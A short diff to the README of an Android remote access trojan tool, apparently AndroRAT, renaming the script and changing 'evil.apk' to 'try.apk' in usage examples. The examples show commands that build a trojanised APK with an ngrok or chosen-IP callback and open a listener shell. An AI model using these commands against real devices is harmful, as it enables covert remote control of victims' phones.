@@ -119,13 +119,13 @@ In the sh shell there are some sub commands
 ## Examples
 
 * To build the apk using ngrok which will also set the listner:
-```python3 androRAT.py --build --ngrok -o evil.apk```
+```python3 androvw.py --build --ngrok -o try.apk```
 
 * To build the apk using desired ip and port:
-```python3 androRAT.py --build -i 192.169.x.x -p 8000 -o evil.apk```
+```python3 androvw.py --build -i 192.169.x.x -p 8000 -o try.apk```
 
 * To get the interpreter:
-```python3 androRAT.py --shell -i 0.0.0.0 -p 8000```
+```python3 androvw.py --shell -i 0.0.0.0 -p 8000```
 
 ## Interpreter Examples
 * Generating APK
